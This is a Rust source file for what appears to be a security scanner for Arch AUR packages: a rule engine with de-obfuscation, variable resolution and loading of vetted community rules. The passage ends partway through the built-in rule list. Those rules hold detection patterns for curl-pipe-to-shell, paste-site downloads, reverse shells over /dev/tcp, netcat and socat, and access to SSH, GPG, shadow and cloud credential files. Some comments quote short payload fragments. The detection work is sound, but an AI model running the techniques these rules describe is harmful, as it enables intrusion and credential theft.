//! Rule engine for pattern-based security detection

mod loader;

pub use loader::RuleLoader;

use crate::error::{Result, ScanError};
use crate::resolve::resolve_variables;
use crate::textutil::{
    deobfuscate, logical_lines, CMD_START, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
};
use crate::types::{Category, FileType, Severity};
use regex::{Regex, RegexBuilder};
use serde::Deserialize;
use std::collections::{HashMap, HashSet};
use std::path::Path;

/// A security detection rule (pattern-based). Community rule files use this
/// shape; `file_types`/`patterns` default to empty so a rule file is concise.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Rule {
    /// Unique identifier (e.g., "DLE-001")
    pub id: String,
    /// Human-readable name
    pub name: String,
    /// Detailed description
    pub description: String,
    /// Severity level
    pub severity: Severity,
    /// Category of the rule
    pub category: Category,
    /// Patterns to match
    #[serde(default)]
    pub patterns: Vec<Pattern>,
    /// File types this rule applies to. Defaults to PKGBUILD + install script
    /// rather than empty: a rule indexed under no file type is silently never
    /// matched, so a community rule that omits `file_types` would be inert.
    #[serde(default = "default_file_types")]
    pub file_types: Vec<FileType>,
    /// Recommendation for fixing
    pub recommendation: String,
    /// CWE ID if applicable
    #[serde(default)]
    pub cwe_id: Option<String>,
    /// Whether this rule is enabled
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Opt out of the case-insensitive default for this rule's regex patterns.
    /// Rules are compiled `(?i)` by default (audit HI-6) so trivial case variation
    /// (`CURL`, `Wget`) cannot evade them; set this `true` for rules keyed on
    /// canonical casing -- environment-variable NAMEs (case-sensitive in bash),
    /// base64/base32 alphabets, or `\xHH` hex assembly -- where folding the case
    /// would over-match. A single span can instead opt out inline with `(?-i:…)`.
    #[serde(default)]
    pub case_sensitive: bool,
}

fn default_true() -> bool {
    true
}

/// Default file types for a rule that does not specify them. Empty would make
/// the rule inert (it is indexed per file type), so default to the two types
/// every scan looks at.
fn default_file_types() -> Vec<FileType> {
    vec![FileType::Pkgbuild, FileType::InstallScript]
}

/// Pattern type for matching
#[derive(Debug, Clone, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
pub enum Pattern {
    /// Regular expression pattern
    Regex { pattern: String },
    /// Literal string match
    Literal {
        text: String,
        #[serde(default)]
        case_sensitive: bool,
    },
    /// Function name pattern
    Function {
        name: String,
        #[serde(default)]
        body_pattern: Option<String>,
    },
    /// Variable value pattern
    Variable {
        name: String,
        #[serde(default)]
        value_pattern: Option<String>,
    },
}

/// A compiled rule with pre-compiled regex patterns
pub struct CompiledRule {
    /// Original rule definition
    pub rule: Rule,
    /// Compiled regex patterns
    pub compiled_patterns: Vec<CompiledPattern>,
}

/// A compiled pattern ready for matching
#[derive(Clone)]
pub enum CompiledPattern {
    Regex(Regex),
    Literal {
        text: String,
        case_sensitive: bool,
    },
    Function {
        name: Regex,
        body_pattern: Option<Regex>,
    },
    Variable {
        name: String,
        value_pattern: Option<Regex>,
    },
}

/// Compile a rule regex with safe defaults.
///
/// * Case-insensitive UNLESS the owning rule opted out (`case_sensitive`), so
///   trivial case variation (`CURL`, `Xmrig`) cannot evade a rule. A single span
///   can instead opt out inline with `(?-i:...)` (e.g. a Base58 address class).
/// * Explicit size/DFA limits: rule patterns can come from filesystem
///   `rules.d` files, so bound compiled-program and DFA memory rather than
///   trusting every author.
fn compile_regex(pattern: &str, case_sensitive: bool) -> Result<Regex> {
    RegexBuilder::new(pattern)
        .case_insensitive(!case_sensitive)
        .size_limit(4 * 1024 * 1024)
        .dfa_size_limit(16 * 1024 * 1024)
        .build()
        .map_err(Into::into)
}

impl CompiledPattern {
    /// Compile a pattern. `case_sensitive` is the owning rule's opt-out flag: when
    /// `false` (the default) regex patterns compile case-insensitively (audit
    /// HI-6). `Pattern::Literal` carries its own per-pattern `case_sensitive`.
    pub fn compile(pattern: &Pattern, case_sensitive: bool) -> Result<Self> {
        match pattern {
            Pattern::Regex { pattern } => {
                let re = compile_regex(pattern, case_sensitive)?;
                Ok(CompiledPattern::Regex(re))
            }
            Pattern::Literal {
                text,
                case_sensitive,
            } => Ok(CompiledPattern::Literal {
                text: text.clone(),
                case_sensitive: *case_sensitive,
            }),
            Pattern::Function { name, body_pattern } => {
                let name_re = compile_regex(name, case_sensitive)?;
                let body_re = body_pattern
                    .as_ref()
                    .map(|p| compile_regex(p, case_sensitive))
                    .transpose()?;
                Ok(CompiledPattern::Function {
                    name: name_re,
                    body_pattern: body_re,
                })
            }
            Pattern::Variable {
                name,
                value_pattern,
            } => {
                let value_re = value_pattern
                    .as_ref()
                    .map(|p| compile_regex(p, case_sensitive))
                    .transpose()?;
                Ok(CompiledPattern::Variable {
                    name: name.clone(),
                    value_pattern: value_re,
                })
            }
        }
    }
}

/// A match result from the rule engine
#[derive(Debug, Clone)]
pub struct RuleMatch {
    /// The rule that matched
    pub rule_id: String,
    /// Line number where the match occurred
    pub line: usize,
    /// Column where the match started
    pub column: usize,
    /// The matched text
    pub matched_text: String,
    /// Context around the match
    pub context: String,
}

/// Rule engine for loading and matching rules
pub struct RuleEngine {
    /// Compiled rules organized by file type
    rules_by_type: HashMap<FileType, Vec<CompiledRule>>,
    /// All rules indexed by ID
    rules_by_id: HashMap<String, CompiledRule>,
}

impl RuleEngine {
    /// Create a new empty rule engine
    pub fn new() -> Self {
        Self {
            rules_by_type: HashMap::new(),
            rules_by_id: HashMap::new(),
        }
    }

    /// Load rules from a directory containing TOML files.
    ///
    /// Every candidate is vetted before it is added: a rule whose id collides
    /// with a built-in, an analyzer code, or an earlier-loaded rule is rejected
    /// with a stderr warning (a user-writable rules directory must never be able
    /// to replace or lower a built-in detection), and a rule that does not
    /// compile or has no patterns is skipped. One bad rule or file never
    /// aborts the rest of the directory.
    pub fn load_rules_from_dir(&mut self, dir: &Path) -> Result<()> {
        let loader = RuleLoader::new();
        let mut reserved = reserved_rule_ids();
        reserved.extend(self.rules_by_id.keys().cloned());
        let rules = loader.load_vetted_from_directory(dir, &mut reserved)?;

        for rule in rules {
            let id = rule.id.clone();
            if let Err(e) = self.add_rule(rule) {
                warn_rule(&format!("skipping rule {id} from {}: {e}", dir.display()));
            }
        }

        Ok(())
    }

    /// Add a single rule to the engine.
    ///
    /// Fails if a rule with the same id is already loaded: the first definition
    /// (built-ins are loaded first) always wins, so nothing can replace or
    /// lower an existing detection by re-using its id.
    pub fn add_rule(&mut self, rule: Rule) -> Result<()> {
        if self.rules_by_id.contains_key(&rule.id) {
            return Err(ScanError::Config(format!(
                "duplicate rule id {}: an earlier rule with this id is already loaded",
                rule.id
            )));
        }
        if !rule.enabled {
            return Ok(());
        }
        if rule.patterns.is_empty() {
            return Err(ScanError::Config(format!(
                "rule {} has no patterns and could never fire",
                rule.id
            )));
        }

        let mut compiled_patterns = Vec::new();
        for pattern in &rule.patterns {
            compiled_patterns.push(CompiledPattern::compile(pattern, rule.case_sensitive)?);
        }

        let compiled = CompiledRule {
            rule: rule.clone(),
            compiled_patterns,
        };

        // Index by file type. Local sidecar scripts (`FileType::SourceFile`) run
        // inside build()/package() just like the PKGBUILD body, so every rule
        // that applies to the PKGBUILD also applies to them.
        let mut types: Vec<FileType> = Vec::new();
        for ft in &rule.file_types {
            if !types.contains(ft) {
                types.push(*ft);
            }
        }
        if types.contains(&FileType::Pkgbuild) && !types.contains(&FileType::SourceFile) {
            types.push(FileType::SourceFile);
        }
        for file_type in &types {
            self.rules_by_type
                .entry(*file_type)
                .or_default()
                .push(CompiledRule {
                    rule: rule.clone(),
                    compiled_patterns: compiled.compiled_patterns.clone(),
                });
        }

        // Index by ID
        self.rules_by_id.insert(rule.id.clone(), compiled);

        Ok(())
    }

    /// Add built-in rules
    ///
    /// A single rule with a malformed pattern must never silently disable the
    /// rest of the built-in ruleset (a missed detection is a security failure),
    /// so a rule that fails to compile is skipped with a warning rather than
    /// aborting the whole load.
    pub fn add_builtin_rules(&mut self) -> Result<()> {
        let builtin_rules = get_builtin_rules();
        for rule in builtin_rules {
            let rule_id = rule.id.clone();
            if let Err(e) = self.add_rule(rule) {
                tracing::warn!("skipping built-in rule {rule_id}: failed to compile: {e}");
            }
        }
        Ok(())
    }

    /// Match content against all rules for a file type
    pub fn match_content(&self, content: &str, file_type: FileType) -> Vec<RuleMatch> {
        let mut matches = Vec::new();

        let rules = match self.rules_by_type.get(&file_type) {
            Some(r) => r,
            None => return matches,
        };

        // Work on *logical* lines: bash backslash-newline continuations are
        // spliced back together so a payload split across physical lines
        // (`curl evil \`<nl>`| sh`) cannot evade a single-line rule. Each entry
        // carries the originating physical line number for reporting.
        let lines: Vec<(usize, String)> = logical_lines(content);
        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
        // De-obfuscated variant per line: ANSI-C quoting (`$'\x63'`) decoded and
        // adjacent-quote word-splitting (`"b"'u''n'`) collapsed, so a payload
        // hidden to dodge literal matching is still seen by every rule (e.g. an
        // obfuscated `bun add` fires ATOMIC-002). `None` for un-obfuscated lines,
        // so ordinary quoted strings are not re-matched.
        let deobf: Vec<Option<String>> = lines.iter().map(|(_, s)| deobfuscate(s)).collect();
        // Variable-resolution variant (the static taint pass, audit HI-6): a
        // payload hidden behind a shell variable (`x=curl; $x …| sh`,
        // `c=$(printf '\x63url'); $c`) evades token matching. `resolve_variables`
        // substitutes statically-evident assignments and is line-count-preserving,
        // so the resolved logical line sits on its start physical line and aligns
        // with `lines` by that line number. Like de-obfuscation it is matched *in
        // addition to* the raw line, so it can only ADD a finding, never suppress.
        let resolved_full = resolve_variables(content);
        let resolved_phys: Vec<&str> = resolved_full.lines().collect();
        let resolved: Vec<Option<String>> = lines
            .iter()
            .map(|(phys, raw)| {
                resolved_phys.get(phys.saturating_sub(1)).and_then(|r| {
                    (*r != raw.as_str() && !r.trim().is_empty()).then(|| (*r).to_string())
                })
            })
            .collect();
        // Lines that are informational text printed to the user (the body of a
        // pure-printer heredoc, e.g. a `cat <<EOF` post_install message) are not
        // executed, so low-risk path-presence rules must not match them. A
        // heredoc fed to an interpreter, or redirected to a file, is still code.
        let informational = informational_lines(&line_strs);

        for compiled in rules {
            for (idx, (phys_line, line)) in lines.iter().enumerate() {
                // Skip pure comment lines and printed heredoc bodies. A heredoc
                // is only marked informational when it is fed to a pure printer
                // (cat/echo/printf) and not piped/redirected; a heredoc fed to an
                // interpreter (`bash <<EOF`) is NOT informational and is scanned
                // here, so executable payloads hidden in a heredoc are caught.
                let trimmed = line.trim();
                if trimmed.starts_with('#') || informational[idx] {
                    continue;
                }

                // Report each (rule, line) at most once, however many of the
                // rule's patterns (or text variants) hit it: a rule with two
                // patterns matching one line must not double its count.
                'patterns: for pattern in &compiled.compiled_patterns {
                    // Try the raw line, then its de-obfuscated form, then its
                    // variable-resolved form. Each variant is matched independently
                    // and can only ADD a finding; the first hit per line wins.
                    if let Some(m) = self.match_pattern(pattern, line, &compiled.rule) {
                        matches.push(RuleMatch {
                            rule_id: compiled.rule.id.clone(),
                            line: *phys_line,
                            column: m.0,
                            matched_text: m.1,
                            context: line.clone(),
                        });
                        break 'patterns;
                    }
                    // Raw line didn't match, but its de-obfuscated form might.
                    if let Some(decoded) = &deobf[idx] {
                        if let Some(m) = self.match_pattern(pattern, decoded, &compiled.rule) {
                            matches.push(RuleMatch {
                                rule_id: compiled.rule.id.clone(),
                                line: *phys_line,
                                column: m.0,
                                matched_text: m.1,
                                context: format!("{line}    [de-obfuscated → {decoded}]"),
                            });
                            break 'patterns;
                        }
                    }
                    // …or its variable-resolved form (a command hidden behind `$x`).
                    if let Some(resolved_line) = &resolved[idx] {
                        if let Some(m) = self.match_pattern(pattern, resolved_line, &compiled.rule)
                        {
                            matches.push(RuleMatch {
                                rule_id: compiled.rule.id.clone(),
                                line: *phys_line,
                                column: m.0,
                                matched_text: m.1,
                                context: format!("{line}    [resolved → {resolved_line}]"),
                            });
                            break 'patterns;
                        }
                    }
                }
            }
        }

        matches
    }

    /// Match a single pattern against a line
    fn match_pattern(
        &self,
        pattern: &CompiledPattern,
        line: &str,
        _rule: &Rule,
    ) -> Option<(usize, String)> {
        match pattern {
            CompiledPattern::Regex(re) => re
                .find(line)
                .map(|m| (m.start() + 1, m.as_str().to_string())),
            CompiledPattern::Literal {
                text,
                case_sensitive,
            } => {
                let found = if *case_sensitive {
                    line.find(text)
                } else {
                    line.to_lowercase().find(&text.to_lowercase())
                };
                found.map(|pos| (pos + 1, text.clone()))
            }
            _ => None, // Function and Variable patterns need different handling
        }
    }

    /// Get a rule by ID
    pub fn get_rule(&self, id: &str) -> Option<&Rule> {
        self.rules_by_id.get(id).map(|c| &c.rule)
    }

    /// Get count of loaded rules
    pub fn rule_count(&self) -> usize {
        self.rules_by_id.len()
    }
}

impl Default for RuleEngine {
    fn default() -> Self {
        let mut engine = Self::new();
        let _ = engine.add_builtin_rules();
        // Load community rule files so user-contributed detections actually run
        // (the same directories the catalog indexes). A malformed file warns and
        // is skipped; it never breaks the engine.
        for dir in user_rule_dirs() {
            if dir.is_dir() {
                if let Err(e) = engine.load_rules_from_dir(&dir) {
                    tracing::warn!(
                        "failed to load community rules from {}: {}",
                        dir.display(),
                        e
                    );
                }
            }
        }
        engine
    }
}

/// Print a loud, stable-prefixed rule-loading warning to stderr (never stdout:
/// stdout carries machine-readable output).
pub(crate) fn warn_rule(msg: &str) {
    eprintln!("aur-scan: warning: {msg}");
}

/// Ids a community rule may never take: every built-in rule and every
/// analyzer-owned code. A rule re-using one of these would shadow or lower it.
pub fn reserved_rule_ids() -> HashSet<String> {
    let mut ids: HashSet<String> = get_builtin_rules().into_iter().map(|r| r.id).collect();
    ids.extend(crate::catalog::analyzer_codes().into_iter().map(|e| e.id));
    ids
}

/// Load, vet and return every community rule from `dirs`, in order, rejecting
/// id collisions with built-ins, analyzer codes and earlier rules. This is the
/// single loader shared by the scan engine and the `codes` catalog, so the
/// catalog lists exactly the rules that will really run.
pub fn load_community_rules<I: IntoIterator<Item = std::path::PathBuf>>(dirs: I) -> Vec<Rule> {
    let loader = RuleLoader::new();
    let mut reserved = reserved_rule_ids();
    let mut out = Vec::new();
    for dir in dirs {
        if !dir.is_dir() {
            continue;
        }
        match loader.load_vetted_from_directory(&dir, &mut reserved) {
            Ok(rules) => out.extend(rules),
            Err(e) => warn_rule(&format!(
                "failed to read community rules from {}: {e}",
                dir.display()
            )),
        }
    }
    out
}

/// True when this process runs with root's effective uid. Uses the owner of
/// `/proc/self` (the process's effective uid) so no libc dependency is needed;
/// if that cannot be determined it fails safe and reports privileged.
pub(crate) fn running_as_root() -> bool {
    use std::os::unix::fs::MetadataExt;
    std::fs::metadata("/proc/self")
        .map(|m| m.uid() == 0)
        .unwrap_or(true)
}

/// Standard directories users/distros can drop community rule TOML files into.
///
/// A root process (the pacman hook) reads only the root-owned system
/// directories: the per-user config dir is writable by any earlier package's
/// `build()`, and must never feed rules to a privileged scanner (same policy as
/// `ScanConfig::resolve_for_privilege`).
pub fn user_rule_dirs() -> Vec<std::path::PathBuf> {
    user_rule_dirs_for(running_as_root())
}

/// [`user_rule_dirs`] with the privilege decision supplied by the caller.
pub fn user_rule_dirs_for(privileged: bool) -> Vec<std::path::PathBuf> {
    let mut dirs = vec![
        std::path::PathBuf::from("/usr/share/aur-scanner/rules.d"),
        std::path::PathBuf::from("/etc/aur-scanner/rules.d"),
    ];
    if !privileged {
        if let Some(cfg) = dirs::config_dir() {
            dirs.push(cfg.join("aur-scanner/rules.d"));
        }
    }
    dirs
}

/// Flag each line that is printed text rather than executed code -- the body of
/// a non-redirected heredoc, or a single-line pure message print (`echo`/`note`/
/// `msg "..."`) -- so path/string-presence rules don't match user-facing
/// messages. (E.g. a `.install` that says `note "put flags in ~/.config/x"` must
/// not trip the "hidden file in home" rule: it mentions a path, it doesn't write
/// one. This was a real false positive on google-chrome / vscode.)
///
/// `pub(crate)` so structural analyzers can share the exact same pre-filter: the
/// privilege analyzer routes function bodies through it so a printed
/// `sudo`/`setcap`/`sudoers` message or a documentation heredoc cannot raise a
/// Critical false positive (defect #5).
pub(crate) fn informational_lines(lines: &[&str]) -> Vec<bool> {
    let mut flags = vec![false; lines.len()];
    let mut terminator: Option<String> = None;
    for (i, line) in lines.iter().enumerate() {
        if let Some(delim) = &terminator {
            flags[i] = true; // inside a printed heredoc body
            if line.trim() == delim.as_str() {
                terminator = None;
            }
            continue;
        }
        if let Some(delim) = heredoc_message_delim(line) {
            terminator = Some(delim);
        } else if is_pure_message_print(line) {
            flags[i] = true;
        }
    }
    flags
}

/// Whether `line` is a single-line message print whose argument is just text the
/// user sees -- it cannot run another command or write a file, so a path/string
/// it mentions is a mention, not an action.
///
/// Conservative on purpose: the command must be a known printer AND the line
/// must contain no redirection, pipe, command substitution, or command chaining
/// (any of which could execute or write). `echo x > ~/.bashrc`, `echo "$(curl
/// evil)"`, and `echo x | sh` therefore are NOT treated as inert.
fn is_pure_message_print(line: &str) -> bool {
    let t = line.trim();
    let cmd = t.split([' ', '\t']).next().unwrap_or("");
    const PRINTERS: &[&str] = &[
        "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
    ];
    if !PRINTERS.contains(&cmd) {
        return false;
    }
    // Anything that could redirect, pipe, substitute, or chain a command means
    // the line is not a pure print -- scan it. Quote-aware: a `;`/`|`/`&`/`>`
    // *inside* the quoted message is literal text, not an operator (the real FP
    // `echo "see ~/.config; then ..."`); command substitution (`$(`/backtick)
    // still counts inside double quotes, where the shell executes it.
    !has_executable_operator(t)
}

/// Whether `t` contains a shell metacharacter that could chain, redirect, or
/// execute another command -- accounting for quoting:
///   * `;` `|` `&` `>` are operators only when UNQUOTED (literal inside both
///     `'...'` and `"..."`).
///   * `$(` and backtick are command substitution: the shell runs them when
///     unquoted OR inside double quotes, and treats them literally only inside
///     single quotes.
///
/// A backslash escapes the next byte when unquoted or inside double quotes (it
/// is literal inside single quotes). Conservative: anything it does not model as
/// safely-quoted falls through to "is an operator" so we scan rather than trust.
fn has_executable_operator(t: &str) -> bool {
    let b = t.as_bytes();
    let (mut i, mut sq, mut dq) = (0usize, false, false);
    while i < b.len() {
        let c = b[i];
        if sq {
            // Inside single quotes everything is literal until the closing `'`.
            if c == b'\'' {
                sq = false;
            }
            i += 1;
            continue;
        }
        if dq {
            // Inside double quotes only command substitution executes.
            match c {
                b'\\' => i += 2,
                b'"' => {
                    dq = false;
                    i += 1;
                }
                b'`' => return true,
                b'$' if b.get(i + 1) == Some(&b'(') => return true,
                _ => i += 1,
            }
            continue;
        }
        // Unquoted.
        match c {
            b'\\' => i += 2,
            b'\'' => {
                sq = true;
                i += 1;
            }
            b'"' => {
                dq = true;
                i += 1;
            }
            b';' | b'|' | b'&' | b'>' | b'`' => return true,
            b'$' if b.get(i + 1) == Some(&b'(') => return true,
            _ => i += 1,
        }
    }
    false
}

/// If `line` opens a heredoc that just prints a message (no redirection to a
/// file), return its terminator delimiter. Redirected heredocs write content
/// somewhere and must still be scanned, so they return `None`.
fn heredoc_message_delim(line: &str) -> Option<String> {
    let pos = line.find("<<")?;
    let rest = line[pos + 2..]
        .strip_prefix('-')
        .unwrap_or(&line[pos + 2..])
        .trim_start();
    let bytes = rest.as_bytes();
    let quote = match bytes.first() {
        Some(&b'"') | Some(&b'\'') => Some(bytes[0]),
        _ => None,
    };
    let mut i = if quote.is_some() { 1 } else { 0 };
    let start = i;
    while i < bytes.len() {
        let c = bytes[i];
        match quote {
            Some(q) if c == q => break,
            Some(_) => i += 1,
            None if c.is_ascii_alphanumeric() || c == b'_' => i += 1,
            None => break,
        }
    }
    if i == start {
        return None;
    }
    let delim = &rest[start..i];
    // `$((x << 2))` is an arithmetic shift, not a heredoc.
    if quote.is_none() && delim.as_bytes()[0].is_ascii_digit() {
        return None;
    }
    // Redirected to a file (`> f`, `>> f`, `| tee f`)? Then it writes content
    // and the body must be scanned.
    let redirected = line.contains(">>")
        || line[..pos].contains('>')
        || rest[i..].contains('>')
        || line.contains("tee ");
    if redirected {
        return None;
    }
    // Only treat the body as printed-not-executed when the consuming command is
    // a pure printer (cat/echo/printf) AND the heredoc is not piped into another
    // command. A heredoc fed to an interpreter -- `bash <<EOF`, `python <<EOF`,
    // `ssh host <<EOF`, `cat <<EOF | bash` -- runs its body, so it must be
    // scanned. When unsure, do NOT suppress (fail toward scanning).
    let before = &line[..pos];
    let last_command = before.rsplit([';', '|', '&', '(']).next().unwrap_or(before);
    // Basename so `/bin/cat` / `/usr/bin/printf` count as pure printers.
    // Path-prefixed printers are common in install scriptlets (issue #15).
    let is_pure_printer = last_command
        .split_whitespace()
        .next()
        .map(|cmd| {
            let base = cmd.rsplit('/').next().unwrap_or(cmd);
            matches!(base, "cat" | "echo" | "printf")
        })
        .unwrap_or(false);
    // A pipe anywhere on the opener means the body may be fed to a command.
    let piped = line.contains('|');
    if !is_pure_printer || piped {
        return None;
    }
    Some(delim.to_string())
}

/// Get built-in security rules (pattern-based). Public so the catalog can
/// index them as the single source of truth.
pub fn get_builtin_rules() -> Vec<Rule> {
    vec![
        // ============================================================
        // CRITICAL: Download and Execute (from real-world attacks)
        // ============================================================
        Rule {
            id: "DLE-001".to_string(),
            name: "Curl pipe to shell".to_string(),
            description: "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Download scripts first, review them, then execute".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "DLE-002".to_string(),
            name: "Wget pipe to shell".to_string(),
            description: "Downloading and executing remote scripts via wget".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Download scripts first, review them, then execute".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "DLE-003".to_string(),
            name: "Curl output executed".to_string(),
            description: "Curl output saved and executed - common malware pattern".to_string(),
            severity: Severity::Critical,
            category: Category::CommandInjection,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"curl\s+.*-o\s+[^\s]+\s*&&.*\b(ba)?sh\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"curl\s+.*-O\s+.*&&.*\./".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review downloaded scripts before execution".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Pastebin downloads (2018 xeactor attack vector)
        // ============================================================
        Rule {
            id: "PASTE-001".to_string(),
            name: "Pastebin download".to_string(),
            description: "Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(curl|wget)\s+.*(pastebin\.com|paste\.ee|ptpb\.pw|ix\.io|dpaste|hastebin|privatebin|ghostbin|rentry\.co)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"https?://(pastebin\.com|paste\.ee|ptpb\.pw|ix\.io|dpaste|hastebin\.com|privatebin|ghostbin\.co|rentry\.co)/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Never download code from paste sites - this is a major red flag".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Reverse Shells
        // ============================================================
        Rule {
            id: "SHELL-001".to_string(),
            name: "Bash reverse shell".to_string(),
            description: "Pattern indicates a bash reverse shell connection".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex {
                // Any /dev/tcp or /dev/udp host/port -- hostname, IPv4, IPv6, or
                // hex/decimal IP -- is a reverse-shell channel. The old rule only
                // matched dotted-quad IPv4 and missed `/dev/tcp/evil.com/4444`,
                // `/dev/tcp/0x7f000001/4444`, IPv6, etc.
                pattern: r"/dev/(tcp|udp)/[^\s/]+/[^\s/]+".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-002".to_string(),
            name: "Netcat reverse shell".to_string(),
            description: "Netcat with an execute flag indicates a reverse shell".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                // `nc`/`ncat`/`netcat` in COMMAND POSITION followed by an
                // execute flag. Three things here are load-bearing, all of them
                // from issue #32 (`git -C MEGAsync -c protocol.file.allow=...`
                // reported as a Critical reverse shell):
                //
                // 1. `{CMD_START}` — an unanchored `nc` matches the tail of any
                //    word ending in those two letters, and `MEGAsync ` is
                //    followed by ` -c `, which is exactly the old pattern.
                // 2. `[^\n;&|]*` rather than `.*` — the flag must belong to
                //    THIS command, so a benign `-c` on a later command in the
                //    same line (`nc -z host 80; git -c foo bar`) cannot be
                //    borrowed to complete the match.
                // 3. `-[A-Za-z]*[ec]\b` — covers bundled short flags (`-nve`)
                //    while `--sh-exec`/`--exec` are listed separately, since a
                //    long flag's leading `--` does not fit the short-flag form.
                Pattern::Regex {
                    pattern: format!(
                        r"{CMD_START}(?:nc|ncat|netcat)\b[^\n;&|]*\s(?:-[A-Za-z]*[ec]\b|--sh-exec\b|--exec\b)"
                    ),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-003".to_string(),
            name: "Python reverse shell".to_string(),
            description: "Python socket connection pattern indicates reverse shell".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"python.*socket.*connect".to_string(),
                },
                Pattern::Regex {
                    pattern: r"python.*-c.*import\s+socket".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove reverse shell code immediately".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "SHELL-004".to_string(),
            name: "Socat shell".to_string(),
            description: "Socat can be used for reverse shells".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"socat\s+.*EXEC:".to_string(),
                },
                Pattern::Regex {
                    pattern: r"socat\s+.*TCP:".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Socat TCP connections are suspicious in build scripts".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Credential Theft
        // ============================================================
        Rule {
            id: "CRED-001".to_string(),
            name: "SSH key access".to_string(),
            description: "Accessing SSH private keys during build/install".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.ssh/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.ssh/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/home/[^/]+/\.ssh/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access user SSH keys".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "CRED-002".to_string(),
            name: "GPG key access".to_string(),
            description: "Accessing GPG keyring during build/install".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.gnupg/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.gnupg/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access user GPG keys".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },
        Rule {
            id: "CRED-003".to_string(),
            name: "Password file access".to_string(),
            description: "Accessing password files or credential stores".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"/etc/shadow".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.password-store".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.netrc".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.aws/credentials".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.kube/config".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Package should never access credential stores".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
            case_sensitive: false,
        },

        // ============================================================
        // CRITICAL: Browser Data Theft
        // ============================================================
        Rule {
            id: "BROWSER-001".to_string(),
            name: "Browser profile access".to_string(),
            description: "Accessing browser profiles may indicate credential theft".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.mozilla/firefox".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.config/google-chrome".to_string(),
                },
                Pattern::Regex {
